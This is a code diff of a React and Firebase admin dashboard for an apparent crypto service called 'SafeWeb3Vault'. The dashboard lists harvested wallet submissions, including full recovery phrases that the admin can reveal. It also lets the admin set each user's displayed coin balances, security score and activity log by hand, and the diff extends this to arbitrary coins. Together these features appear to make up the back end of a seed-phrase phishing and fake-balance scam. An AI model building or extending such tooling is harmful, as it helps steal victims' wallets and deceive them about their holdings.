@@ -4,10 +4,7 @@ import { auth, db } from "../firebase/firebase";
 import { signOut } from "firebase/auth";
 import { useNavigate } from "react-router-dom";
 import {
-  collection,
-  onSnapshot,
-  doc,
-  updateDoc,
+  collection, onSnapshot, doc, updateDoc,
 } from "firebase/firestore";
 import { useEffect, useState } from "react";
 import {
@@ -16,7 +13,7 @@ import {
   Activity, Eye, EyeOff,
 } from "lucide-react";
 
-const COIN_KEYS = ["BTC", "ETH", "SOL", "BNB", "XRP"];
+const DEFAULT_COINS = ["BTC", "ETH", "SOL", "BNB", "XRP"];
 
 function AdminDashboard() {
   const navigate = useNavigate();
@@ -30,7 +27,6 @@ function AdminDashboard() {
   const [toast, setToast] = useState(null);
   const [revealedPhrases, setRevealedPhrases] = useState({});
 
-  // Load all users
   useEffect(() => {
     const unsub = onSnapshot(collection(db, "users"), (snap) => {
       setUsers(snap.docs.map((d) => ({ id: d.id, ...d.data() })));
@@ -38,7 +34,6 @@ function AdminDashboard() {
     return unsub;
   }, []);
 
-  // Load all wallet submissions from walletConnections collection
   useEffect(() => {
     const unsub = onSnapshot(collection(db, "walletConnections"), (snap) => {
       const docs = snap.docs.map((d) => ({ id: d.id, ...d.data() }));
@@ -59,10 +54,17 @@ function AdminDashboard() {
   };
 
   const startEditing = (user) => {
+    // Build coin list: default coins + any extra coins the user already has
+    const existingCoins = Object.keys(user.crypto || {});
+    const allCoins = [...new Set([...DEFAULT_COINS, ...existingCoins])];
+
     setEditState((prev) => ({
       ...prev,
       [user.id]: {
         crypto: { ...user.crypto },
+        coinList: allCoins,
+        newCoinName: "",
+        newCoinAmount: "",
         securityScore: user.securityScore ?? 0,
         connectedWallets: user.connectedWallets ?? 0,
         activity: [...(user.activity || [])],
@@ -86,6 +88,43 @@ function AdminDashboard() {
       [uid]: { ...prev[uid], crypto: { ...prev[uid].crypto, [coin]: value } },
     }));
 
+  // Add a brand new custom coin
+  const addCoin = (uid) => {
+    const name = editState[uid]?.newCoinName?.trim().toUpperCase();
+    const amount = editState[uid]?.newCoinAmount?.trim();
+    if (!name) return;
+    if (editState[uid].coinList.includes(name)) {
+      showToast(`${name} already exists`, "error");
+      return;
+    }
+    setEditState((prev) => ({
+      ...prev,
+      [uid]: {
+        ...prev[uid],
+        coinList: [...prev[uid].coinList, name],
+        crypto: { ...prev[uid].crypto, [name]: amount || "0" },
+        newCoinName: "",
+        newCoinAmount: "",
+      },
+    }));
+  };
+
+  // Remove a coin entirely
+  const removeCoin = (uid, coin) => {
+    setEditState((prev) => {
+      const newCrypto = { ...prev[uid].crypto };
+      delete newCrypto[coin];
+      return {
+        ...prev,
+        [uid]: {
+          ...prev[uid],
+          coinList: prev[uid].coinList.filter((c) => c !== coin),
+          crypto: newCrypto,
+        },
+      };
+    });
+  };
+
   const addActivity = (uid) => {
     const text = editState[uid]?.newActivity?.trim();
     if (!text) return;
@@ -106,7 +145,9 @@ function AdminDashboard() {
     try {
       const s = editState[uid];
       const cryptoClean = {};
-      COIN_KEYS.forEach((c) => { cryptoClean[c] = Number(s.crypto?.[c] || 0); });
+      s.coinList.forEach((c) => {
+        cryptoClean[c] = Number(s.crypto?.[c] || 0);
+      });
       await updateDoc(doc(db, "users", uid), {
         crypto: cryptoClean,
         securityScore: Number(s.securityScore),
@@ -135,9 +176,11 @@ function AdminDashboard() {
       {/* SIDEBAR */}
       <aside className="admin-sidebar">
         <div className="admin-logo">
-          <span className="logo-safe">Safe</span>
-          <span className="logo-web3">Web3</span>
-          <span className="logo-vault">Vault</span>
+          <div className="logo-text">
+            <span className="logo-safe">Safe</span>
+            <span className="logo-web3">Web3</span>
+            <span className="logo-vault">Vault</span>
+          </div>
           <span className="admin-badge">Admin</span>
         </div>
 
@@ -159,21 +202,19 @@ function AdminDashboard() {
         </nav>
 
         <button className="admin-logout" onClick={handleLogout}>
-          <LogOut size={16} /> Logout
+          <LogOut size={16} /> <span>Logout</span>
         </button>
       </aside>
 
       {/* MAIN */}
       <main className="admin-main">
         <header className="admin-header">
-          <div>
-            <h1>{activeTab === "users" ? "User Management" : "Wallet Submissions"}</h1>
-            <p className="admin-subtitle">
-              {activeTab === "users"
-                ? `${users.length} registered user${users.length !== 1 ? "s" : ""}`
-                : `${submissions.length} total submission${submissions.length !== 1 ? "s" : ""}`}
-            </p>
-          </div>
+          <h1>{activeTab === "users" ? "User Management" : "Wallet Submissions"}</h1>
+          <p className="admin-subtitle">
+            {activeTab === "users"
+              ? `${users.length} registered user${users.length !== 1 ? "s" : ""}`
+              : `${submissions.length} total submission${submissions.length !== 1 ? "s" : ""}`}
+          </p>
         </header>
 
         {/* ── USERS TAB ── */}
@@ -202,7 +243,7 @@ function AdminDashboard() {
                     <div className="user-meta">
                       <span className="meta-chip"><Shield size={12} /> {user.securityScore ?? 0}%</span>
                       <span className="meta-chip"><Wallet size={12} /> {user.connectedWallets ?? 0}</span>
-                      <span className="meta-chip"><Bitcoin size={12} /> {Object.keys(user.crypto || {}).length} assets</span>
+                      <span className="meta-chip"><Bitcoin size={12} /> {Object.keys(user.crypto || {}).length}</span>
                     </div>
                     <button className="expand-btn">
                       {isExpanded ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
@@ -211,20 +252,54 @@ function AdminDashboard() {
 
                   {isExpanded && isEditing && (
                     <div className="edit-panel">
+
                       {/* CRYPTO BALANCES */}
                       <div className="edit-section">
                         <h4 className="edit-section-title"><Bitcoin size={16} /> Crypto Balances</h4>
+
                         <div className="crypto-grid">
-                          {COIN_KEYS.map((coin) => (
+                          {ed.coinList?.map((coin) => (
                             <div className="crypto-field" key={coin}>
                               <label>{coin}</label>
-                              <input
-                                type="number" min="0" step="any"
-                                value={ed.crypto?.[coin] ?? 0}
-                                onChange={(e) => updateCrypto(user.id, coin, e.target.value)}
-                              />
+                              <div className="crypto-input-row">
+                                <input
+                                  type="number" min="0" step="any"
+                                  value={ed.crypto?.[coin] ?? 0}
+                                  onChange={(e) => updateCrypto(user.id, coin, e.target.value)}
+                                />
+                                <button
+                                  className="remove-coin-btn"
+                                  onClick={() => removeCoin(user.id, coin)}
+                                  title={`Remove ${coin}`}
+                                >
+                                  <X size={13} />
+                                </button>
+                              </div>
                             </div>
                           ))}
+                        </div>
+
+                        {/* ADD NEW COIN */}
+                        <div className="add-coin-row">
+                          <input
+                            type="text"
+                            placeholder="Coin (e.g. DOGE)"
+                            value={ed.newCoinName || ""}
+                            onChange={(e) => updateField(user.id, "newCoinName", e.target.value)}
+                            className="add-coin-name"
+                            onKeyDown={(e) => e.key === "Enter" && addCoin(user.id)}
+                          />
+                          <input
+                            type="number"
+                            placeholder="Amount"
+                            value={ed.newCoinAmount || ""}
+                            onChange={(e) => updateField(user.id, "newCoinAmount", e.target.value)}
+                            className="add-coin-amount"
+                            onKeyDown={(e) => e.key === "Enter" && addCoin(user.id)}
+                          />
+                          <button className="add-btn" onClick={() => addCoin(user.id)}>
+                            <Plus size={16} />
+                          </button>
                         </div>
                       </div>
 
@@ -266,9 +341,7 @@ function AdminDashboard() {
                           </button>
                         </div>
                         <div className="activity-entries">
-                          {ed.activity?.length === 0 && (
-                            <p className="empty-activity">No activity entries.</p>
-                          )}
+                          {ed.activity?.length === 0 && <p className="empty-activity">No activity entries.</p>}
                           {ed.activity?.map((entry, i) => (
                             <div className="activity-entry" key={i}>
                               <span>{entry}</span>
@@ -285,11 +358,7 @@ function AdminDashboard() {
                         <button className="btn-cancel-edit" onClick={() => cancelEditing(user.id)}>
                           <X size={16} /> Discard
                         </button>
-                        <button
-                          className="btn-save"
-                          onClick={() => saveUser(user.id)}
-                          disabled={saving === user.id}
-                        >
+                        <button className="btn-save" onClick={() => saveUser(user.id)} disabled={saving === user.id}>
                           <Save size={16} />
                           {saving === user.id ? "Saving…" : "Save Changes"}
                         </button>
@@ -306,7 +375,6 @@ function AdminDashboard() {
         {activeTab === "submissions" && (
           <section className="admin-section">
             {submissions.length === 0 && <div className="empty-state">No submissions yet.</div>}
-
             <div className="submissions-grid">
               {submissions.map((sub) => (
                 <div className="submission-card" key={sub.id}>
@@ -314,7 +382,6 @@ function AdminDashboard() {
                     <div className="sub-wallet-type">{sub.walletType || "Unknown Wallet"}</div>
                     <div className="sub-date">{formatDate(sub.createdAt)}</div>
                   </div>
-
                   <div className="sub-fields">
                     <div className="sub-field">
                       <span className="sub-label">Name</span>
@@ -330,9 +397,7 @@ function AdminDashboard() {
                     </div>
                     <div className="sub-field">
                       <span className="sub-label">Wallet UID</span>
-                      <span className="sub-value" style={{ fontFamily: "monospace", fontSize: 12 }}>
-                        {sub.walletUID || "—"}
-                      </span>
+                      <span className="sub-value uid-text">{sub.walletUID || "—"}</span>
                     </div>
                     <div className="sub-field phrase-field">
                       <span className="sub-label">Recovery Phrase</span>
@@ -342,11 +407,7 @@ function AdminDashboard() {
                             ? sub.recoveryPhrase
                             : "•".repeat(Math.min(sub.recoveryPhrase?.length || 32, 40))}
                         </span>
-                        <button
-                          className="reveal-btn"
-                          onClick={() => togglePhrase(sub.id)}
-                          title={revealedPhrases[sub.id] ? "Hide phrase" : "Reveal phrase"}
-                        >
+                        <button className="reveal-btn" onClick={() => togglePhrase(sub.id)}>
                           {revealedPhrases[sub.id] ? <EyeOff size={15} /> : <Eye size={15} />}
                         </button>
                       </div>
